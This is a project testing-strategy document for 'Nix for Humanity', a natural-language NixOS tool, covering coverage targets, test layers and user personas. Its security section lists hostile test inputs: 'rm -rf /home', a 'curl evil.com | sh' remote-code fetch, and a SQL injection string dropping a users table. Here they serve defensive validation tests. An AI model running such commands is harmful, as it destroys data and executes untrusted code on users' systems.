# 🧪 Nix for Humanity Testing Strategy

## Overview

This document outlines the comprehensive testing strategy for Nix for Humanity, aiming for >95% code coverage and ensuring reliability and quality.

## Testing Philosophy

Our testing follows the **Sacred Trinity** approach:
- **Human (Tristan)**: Defines test scenarios based on real user needs
- **Claude Code Max**: Implements comprehensive test suites
- **Local LLM**: Validates NixOS-specific behaviors

## Current Status

### Coverage Report (as of 2025-01-29)
- **Overall Coverage**: 62% → Target: >95%
- **Core Modules**: 91-100% (excellent)
- **UI Components**: 0% (acceptable - CLI/TUI tested manually)

### Module Coverage Breakdown
| Module | Coverage | Status |
|--------|----------|--------|
| ✅ **interface.py** | 100% | Complete |
| ✅ **planning.py** | 100% | Complete |
| ✅ **intent_engine.py** | 100% | Complete |
| ✅ **knowledge_base.py** | 94% | Nearly complete |
| ✅ **learning_system.py** | 93% | Nearly complete |
| ✅ **engine.py** | 91% | Good coverage |
| ✅ **execution_engine.py** | 90% | Good coverage |
| ⚠️ **personality_system.py** | 77% | Needs improvement |
| ❌ **cli_adapter.py** | 0% | Manual testing only |
| ❌ **tui/app.py** | 0% | Manual testing only |

## Testing Layers

### 1. Unit Tests
**Location**: `tests/unit/`
**Coverage Target**: >95% for core modules

Each core module has comprehensive unit tests:
- `test_knowledge_base.py` - Database operations, caching
- `test_execution_engine.py` - Command validation, safe execution
- `test_core_engine.py` - Main pipeline, planning
- `test_intent_engine.py` - Natural language understanding
- `test_personality_system.py` - Response adaptation
- `test_learning_system.py` - User interaction tracking

### 2. Integration Tests
**Location**: `tests/integration/` (to be created)
**Purpose**: Test module interactions

Planned integration tests:
- End-to-end query processing
- Multi-module workflows
- Database persistence
- Command execution chains

### 3. System Tests
**Location**: `tests/system/` (to be created)
**Purpose**: Full system behavior

Planned system tests:
- Real NixOS command execution (in VM)
- Voice interface integration
- Performance benchmarks
- Security validation

### 4. Manual Testing
**Location**: `tests/manual/`
**Purpose**: UI/UX validation

Manual test scenarios for:
- CLI interface usability
- TUI responsiveness
- Voice interaction quality
- Error recovery flows

## Test Infrastructure

### Test Runner
**File**: `tests/run_all_tests.py`

Features:
- Unit test discovery
- Coverage reporting (text, HTML, XML)
- Code quality checks (when tools available)
- Performance benchmarks
- Configurable minimum coverage

Usage:
```bash
# Run all tests with coverage
python tests/run_all_tests.py

# Run only unit tests
python tests/run_all_tests.py --unit

# Generate HTML coverage report
python tests/run_all_tests.py --coverage --html

# Run with verbose output
python tests/run_all_tests.py -v

# Stop on first failure
python tests/run_all_tests.py --failfast
```

### Coverage Tools
**Primary**: Python coverage.py

```bash
# Run in Nix environment
nix-shell -p python3Packages.coverage --run "python tests/run_all_tests.py --coverage"
```

## Testing Best Practices

### 1. Test Naming
- Clear, descriptive names: `test_<what>_<condition>_<expected>`
- Example: `test_recognize_install_patterns`

### 2. Test Structure
```python
def test_feature(self):
    """Test description"""
    # Arrange
    setup_test_data()
    
    # Act
    result = perform_action()
    
    # Assert
    self.assertEqual(result, expected)
```

### 3. Mock External Dependencies
- Mock subprocess calls for command execution
- Mock file system operations when possible
- Use temporary databases for testing

### 4. Test Data
- Use realistic test data
- Cover edge cases
- Test error conditions

### 5. Performance
- Keep unit tests fast (<1ms each)
- Use setUp/tearDown efficiently
- Parallelize when possible

## Security Testing

### Command Injection Prevention
All user input must be validated:
```python
def test_validate_command_dangerous_patterns(self):
    """Test detection of dangerous patterns"""
    dangerous_commands = [
        Command('rm', ['-rf', '/home'], True, False, 'Bad'),
        Command('curl', ['evil.com', '|', 'sh'], True, False, 'Bad'),
    ]
```

### Input Sanitization
Test SQL injection prevention:
```python
def test_sql_injection_prevention(self):
    """Ensure queries are parameterized"""
    malicious_input = "'; DROP TABLE users; --"
    # Should safely handle without executing injection
```

## Continuous Improvement

### Metrics to Track
1. **Code Coverage**: Target >95%
2. **Test Execution Time**: <5 seconds for unit tests
3. **Test Stability**: 0 flaky tests
4. **Bug Discovery Rate**: Tests should find bugs before users

### Regular Reviews
- Weekly: Review coverage reports
- Monthly: Update test scenarios
- Quarterly: Performance benchmark review

## Test Categories by User Persona

### Grandma Rose (Voice-First)
- Voice recognition accuracy
- Clear error messages
- Simple command success

### Maya (ADHD, Speed-Focused)
- Response time <2 seconds
- Minimal distractions
- Quick shortcuts

### Dr. Sarah (Power User)
- Complex command chains
- Batch operations
- Advanced features

### Alex (Blind Developer)
- Screen reader compatibility
- Keyboard navigation
- Audio feedback

## Future Enhancements

### 1. Property-Based Testing
Use hypothesis for generating test cases:
```python
from hypothesis import given, strategies as st

@given(st.text())
def test_intent_recognition_never_crashes(text):
    """Intent engine handles any input gracefully"""
    intent = engine.recognize(text)
    assert intent.type is not None
```

### 2. Mutation Testing
Use mutmut to verify test quality:
```bash
mutmut run --paths-to-mutate src/nix_for_humanity
```

### 3. Load Testing
Test system under stress:
- 1000 concurrent queries
- Large package searches
- Memory constraints

## Getting to 95% Coverage

### Immediate Actions
1. ✅ Complete personality_system.py tests (77% → 95%)
2. ✅ Add missing edge cases to learning_system.py
3. ✅ Cover error paths in execution_engine.py

### Acceptable Exclusions
- CLI adapter (tested manually)
- TUI interface (visual testing)
- Example scripts
- Development tools

## Conclusion

Our testing strategy ensures Nix for Humanity is:
- **Reliable**: Comprehensive test coverage
- **Secure**: Input validation and sanitization
- **Fast**: Optimized test execution
- **Maintainable**: Clear test structure

By following this strategy, we maintain quality while enabling rapid development through the Sacred Trinity collaboration model.

---

*"Quality is not an act, it is a habit." - Aristotle*

**Test early, test often, test thoroughly!** 🧪✨